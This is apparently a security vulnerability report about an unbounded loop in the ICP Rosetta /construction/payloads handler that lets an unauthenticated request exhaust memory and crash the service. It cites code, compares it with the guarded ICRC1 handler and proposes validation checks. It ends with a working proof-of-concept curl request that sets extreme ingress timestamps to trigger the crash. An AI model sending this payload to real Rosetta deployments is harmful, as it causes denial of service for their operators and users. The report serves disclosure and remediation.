### Title
Unbounded ingress-expiry loop in ICP Rosetta `/construction/payloads` causes OOM crash — (`rs/rosetta-api/icp/src/request_handler/construction_payloads.rs`)

---

### Summary

The ICP Rosetta `construction_payloads` handler accepts attacker-controlled `ingress_start` and `ingress_end` u64 nanosecond timestamps with no upper-bound or range validation. A single unauthenticated HTTP POST with `ingress_start=0` and `ingress_end=u64::MAX` drives an unbounded `while now < ingress_end` loop that pushes entries into `ingress_expiries` until the process is OOM-killed. The ICRC1 counterpart has explicit guards for exactly this case; the ICP handler has none.

---

### Finding Description

**Interval computation** (line 59-60):

```
interval = MAX_INGRESS_TTL(300s) - PERMITTED_DRIFT(60s) - 120s = 120s
         = 120_000_000_000 nanoseconds
``` [1](#0-0) 

**The unguarded loop** (lines 99-107):

```rust
let mut ingress_expiries = vec![];
let mut now = ingress_start;
while now < ingress_end {
    ingress_expiries.push(ingress_expiry);
    now += interval;          // AddAssign via Time::from_duration → as u64 truncation
}
``` [2](#0-1) 

With `ingress_start=0` and `ingress_end=u64::MAX`:

- Iterations before OOM: `u64::MAX / 120_000_000_000 ≈ 153 billion`
- Memory per iteration: 8 bytes (one `u64` pushed to `ingress_expiries`)
- Total memory before first wrap: ~1.2 TB → process is OOM-killed far earlier

Additionally, `Time::add_assign` uses `Duration::from_nanos(self.0) + other` then casts the `u128` result back to `u64` via `as u64`, which silently truncates/wraps when `now` approaches `u64::MAX`. This means `now` can wrap back to a small value, making `now < ingress_end` true again and producing an **infinite loop** rather than merely a very long one. [3](#0-2) [4](#0-3) 

**No guards exist** in the ICP handler. The ICRC1 counterpart explicitly rejects this at lines 148-158:

```rust
if ingress_start >= ingress_end {
    return Err(...);
}
if ingress_end < now + ingress_interval {
    return Err(...);
}
``` [5](#0-4) 

The ICP Rosetta server applies only a 4 MB JSON body size limit, which does not protect against this attack — the malicious payload is a few dozen bytes. [6](#0-5) 

The `ConstructionPayloadsRequestMetadata` struct accepts `ingress_start` and `ingress_end` as plain `Option<u64>` with no range validation at deserialization time. [7](#0-6) 

---

### Impact Explanation

An unauthenticated attacker sends one HTTP POST to `/construction/payloads`. The Rosetta process enters an effectively infinite allocation loop and is OOM-killed by the OS. The ICP Rosetta service becomes unavailable until restarted. Repeated requests prevent recovery. No privileged access, no key material, and no IC-protocol interaction is required.

---

### Likelihood Explanation

The endpoint is publicly reachable (no authentication), the attack payload is trivially small, and the vulnerable code path is exercised on every call that supplies metadata. The ICRC1 sibling already demonstrates the correct fix, confirming the ICP handler was simply never updated with the same guard.

---

### Recommendation

Mirror the ICRC1 guards immediately after `ingress_start`/`ingress_end` are resolved:

```rust
if ingress_start >= ingress_end {
    return Err(ApiError::invalid_request(
        "ingress_start must be strictly before ingress_end",
    ));
}
// Optionally cap the window to a reasonable maximum (e.g., 24 hours)
let max_window = Duration::from_secs(24 * 3600);
if ingress_end > ingress_start + max_window {
    return Err(ApiError::invalid_request(
        "ingress window exceeds maximum allowed duration",
    ));
}
``` [8](#0-7) 

---

### Proof of Concept

```bash
curl -s -X POST http://<rosetta-host>:8080/construction/payloads \
  -H 'Content-Type: application/json' \
  -d '{
    "network_identifier": {"blockchain":"Internet Computer","network":"00000000000000020101"},
    "operations": [{"operation_identifier":{"index":0},"type":"TRANSACTION",
      "account":{"address":"<valid-account>"},
      "amount":{"value":"-100","currency":{"symbol":"ICP","decimals":8}}}],
    "public_keys": [{"hex_bytes":"<valid-pubkey>","curve_type":"edwards25519"}],
    "metadata": {
      "ingress_start": 0,
      "ingress_end": 18446744073709551615
    }
  }'
# Rosetta process OOM-killed; subsequent requests return connection refused.
```

### Citations

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L59-60)
```rust
        let interval =
            ic_limits::MAX_INGRESS_TTL - ic_limits::PERMITTED_DRIFT - Duration::from_secs(120);
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L74-107)
```rust
        let ingress_start = meta
            .as_ref()
            .and_then(|meta| meta.ingress_start)
            .map(ic_types::time::Time::from_nanos_since_unix_epoch)
            .unwrap_or_else(ic_types::time::current_time);

        let ingress_end = meta
            .as_ref()
            .and_then(|meta| meta.ingress_end)
            .map(ic_types::time::Time::from_nanos_since_unix_epoch)
            .unwrap_or_else(|| ingress_start + interval);

        let created_at_time: ic_ledger_core::timestamp::TimeStamp = meta
            .as_ref()
            .and_then(|meta| meta.created_at_time)
            .map(ic_ledger_core::timestamp::TimeStamp::from_nanos_since_unix_epoch)
            .unwrap_or_else(|| std::time::SystemTime::now().into());

        // FIXME: the memo field needs to be associated with the operation
        let memo: Memo = meta
            .as_ref()
            .and_then(|meta| meta.memo)
            .map(Memo)
            .unwrap_or_else(|| Memo(rand::thread_rng().r#gen()));

        let mut ingress_expiries = vec![];
        let mut now = ingress_start;
        while now < ingress_end {
            let ingress_expiry = (now
                + ic_limits::MAX_INGRESS_TTL.saturating_sub(ic_limits::PERMITTED_DRIFT))
            .as_nanos_since_unix_epoch();
            ingress_expiries.push(ingress_expiry);
            now += interval;
        }
```

**File:** rs/types/types/src/time.rs (L55-58)
```rust
impl std::ops::AddAssign<Duration> for Time {
    fn add_assign(&mut self, other: Duration) {
        *self = Time::from_duration(Duration::from_nanos(self.0) + other)
    }
```

**File:** rs/types/types/src/time.rs (L103-105)
```rust
    fn from_duration(t: Duration) -> Self {
        Time(t.as_nanos() as u64)
    }
```

**File:** rs/rosetta-api/icrc1/src/construction_api/services.rs (L148-158)
```rust
    if ingress_start >= ingress_end {
        return Err(Error::processing_construction_failed(&format!(
            "Ingress start should start before ingress end: Start: {ingress_start}, End: {ingress_end}"
        )));
    }

    if ingress_end < now + ingress_interval {
        return Err(Error::processing_construction_failed(&format!(
            "Ingress end should be at least one interval from the current time: Current time: {now}, End: {ingress_end}"
        )));
    }
```

**File:** rs/rosetta-api/icp/src/rosetta_server.rs (L297-299)
```rust
                    web::JsonConfig::default()
                        .limit(4 * 1024 * 1024)
                        .error_handler(move |e, _| {
```

**File:** rs/rosetta-api/icp/src/models.rs (L201-223)
```rust
pub struct ConstructionPayloadsRequestMetadata {
    /// The memo to use for a ledger transfer.
    /// A random number is used by default.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub memo: Option<u64>,

    /// The earliest acceptable expiry date for a ledger transfer.
    /// Must be within 24 hours from created_at_time.
    /// Represents number of nanoseconds since UNIX epoch.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub ingress_start: Option<u64>,

    /// The latest acceptable expiry date for a ledger transfer.
    /// Must be within 24 hours from created_at_time.
    /// Represents number of nanoseconds since UNIX epoch.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub ingress_end: Option<u64>,

    /// If present, overrides ledger transaction creation time.
    /// Represents number of nanoseconds since UNIX epoch.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub created_at_time: Option<u64>,
}
```
